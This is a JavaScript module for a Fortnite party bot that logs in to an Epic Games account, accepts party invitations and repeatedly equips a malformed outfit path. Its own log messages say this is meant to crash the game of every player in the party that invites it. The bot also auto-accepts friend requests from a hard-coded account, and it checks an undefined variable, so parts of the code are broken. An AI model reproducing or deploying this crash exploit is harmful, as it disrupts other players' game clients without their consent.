module.exports = {
  run: function() {
const EGClient = require('epicgames-client').Client;
                  const Fortnite = require('epicgames-fortnite-client');
                  const { EPlatform, EInputType, EPartyPrivacy } = require('epicgames-client');
                  const config = require('../../../config.json');
                  const { email, password, YourAccountName, Cosmetics } = require("../../../config.json");
                  const request = require("request-promise");
                  const { ESubGame } = Fortnite;

                console.log('Crash mode turned on.');

                request({
                  url: 'http://benbotfn.tk:8080/api/status',
                  json: true
                }).then(results => {
                  var version = results.currentFortniteVersionNumber
                  var paks = results.totalPakCount
                  console.log('( Fortnite Info )');
                  console.log('[Fortnite] Pak Ammount: ' + paks);
                  console.log('[Fortnite] Version: ' + version);
                });

                var cid = Cosmetics.cid
                // var Console = config.Console

                request({
                  url: 'http://benbotfn.tk:8080/api/cosmetics/search/multiID?id=' + cid,
                  json: true
              }).then(res => {
                  try {
                    Object.keys(res).forEach(function(key) {
                      if(res[key].type == "Outfit") {
                        var query = res[key]
                        console.log('[Fortnite] When a player invites the bot the client will put on ' + query.displayName + '.');
                      }
                    });
                  }
                  catch(err) {
                    console.log(err);
                  }
                });

                
                if(!netcl) return console.log(`For some reason the netcl isn't working, check the github maybe.`);

                let eg = new EGClient({ // For this make a new account that has nothing and put the details in here.
                  email: email, // Remember to add your bot account email in here or it won't work!
                  password: password,  // Remember to add your bot account password in here or it won't work!
                  debug: console.log,
                  useWaitingRoom: false,
                  autoPresenceUpdating: false,
                  defaultPartyConfig: {
                    privacy: EPartyPrivacy.PUBLIC,
                    joinConfirmation: false,
                    joinability: 'OPEN', // Opens the party and allows it to be joined
                    maxSize: 16,
                    subType: 'default',
                    type: 'default',
                    inviteTTL: 14400,
                    chatEnabled: true,
                }
                  });

                eg.init().then(async (success) => {

                  var current_party;

                  if(!success)
                    throw new Error('Cannot initialize EpicGames launcher.');

                  if(!await eg.login())
                    throw new Error('Cannot login on EpicGames account.');

                    const fortnite = await eg.runGame(Fortnite, {
                      netCL: 696969696
                      });

                      var Player = await eg.getProfile(YourAccountName);
                      var Kekistanz = await eg.getProfile('Kekistanz');
                      var friendrequest = await eg.getRawFriends(true);

                      friendrequest.forEach(friendrequest => {
                        if (friendrequest.status.toLowerCase() === 'pending') {
                          if(friendrequest.accountId == Kekistanz.id) {
                            eg.acceptFriendRequest(friendrequest.accountId);
                          }
                          if(friendrequest.accountId == Player.id) {
                            eg.acceptFriendRequest(friendrequest.accountId);
                            console.log('[FRIEND PENDING] You had a request pending to the bot, the bot accepted it.')
                          }
                          else{
                          }
                      } 
                      });
                                        //Name of playlist  Playlist ID
             await fortnite.party.setPlaylist('The End', 'Playlist_Music_High');
             await fortnite.party.me.setOutfit("/Game/Athena/Items/Cosmetics/Characters//./");
             // https://jsonstorage.net/api/items/47c6b54c-b978-4122-ad66-e0f8071cf5d9 for playlists

                              const br = await fortnite.runSubGame(ESubGame.BattleRoyale);   
                    
              console.log('[CLIENT] In the account ' + eg.account.displayName + ', there is only ' + fortnite.vbucks + ' vbucks on that account.');

              // console.log(fortnite.inventory.findItemsByClass('AthenaCharacter'));
              // Tells you everything that is a fortnite character in the bots locker, which there isn't one.

              fortnite.communicator.on('friend:request', async data => {
                if(!YourAccountName) return console.log(`You don't have anyname mentioned in config.`);
               if(!Player) return console.log('The name you provided ' + `'` + YourAccountName + `', isn't right.` );
               var UnkownPlayer = await eg.getProfile(data.friend.id);
               if(data.friend.id == Kekistanz.id){
                eg.acceptFriendRequest(data.friend.id).then(async (ac_result) => {
                  console.log('[FRIEND REQUEST] :) Added!C̵̡̢̧̛̛͖͍̗͖̘̟̩͕̠̦̮̰̱̰͕͉̙̦͍̹͍̙̣̣̖̩̯̺̦͚̫̱̹̖̱̟̖̝͊̆̐̎̌̏̈́͆̀̿̓̓̆͆̂̈̓̈́͒̅̿̎̾̍̈́̈́́͗̊̈́͌̏͒ͅ ');
              });
               } 
               if(data.friend.id == Player.id){
                    eg.acceptFriendRequest(data.friend.id).then(async (ac_result) => {
                        console.log('[FRIEND REQUEST] You sent a friend request! Added!');
                    });
                }
                 else{
                  eg.declineFriendRequest(data.friend.id).then(async (ac_result) => {
                    console.log(`[FRIEND REQUEST] ${UnkownPlayer.displayName} sent a friend request! The bot declined the friend request!`);
                    console.log('[INFO] If it was you, change your name in config!');
                });
                }
            });  

                      fortnite.communicator.on('party:member:state:updated', async (member) => {
                        fortnite.party.me.setOutfit("/Game/Athena/Items/Cosmetics/Characters//./");
                      });


                    fortnite.communicator.on('party:invitation', async (invitation) => {
                      await invitation.accept()
                            current_party = invitation.party;
                            var partyleader = await eg.getProfile(current_party.leader.id);
                            console.log('[PARTY INVITED] A player has invited the bot, the bot will join shortly and crash them.');
                      console.log('[PARTY INFO] The party leader of the party is ' + partyleader.displayName + `, there is currently ${fortnite.party.members.length} members in the party, which the bot is going to crash :).`);
                    });

                    fortnite.communicator.on('party:member:kicked', async (member) => {
                     await fortnite.party.me.setOutfit("/Game/Athena/Items/Cosmetics/Characters//./");
                    });

                  fortnite.communicator.on('party:member:left', async (member) => {
                   await fortnite.party.me.setOutfit("/Game/Athena/Items/Cosmetics/Characters//./");
                  });

                  fortnite.communicator.on('party:member:promoted', async () => {
                    await fortnite.party.me.setOutfit("/Game/Athena/Items/Cosmetics/Characters//./");
                });

                fortnite.communicator.on('party:member:joined', async () => { 
               await fortnite.party.me.setOutfit("/Game/Athena/Items/Cosmetics/Characters//./");
                });

                            fortnite.communicator.updateStatus(config.Client.status);
                          });
                      }
                    }
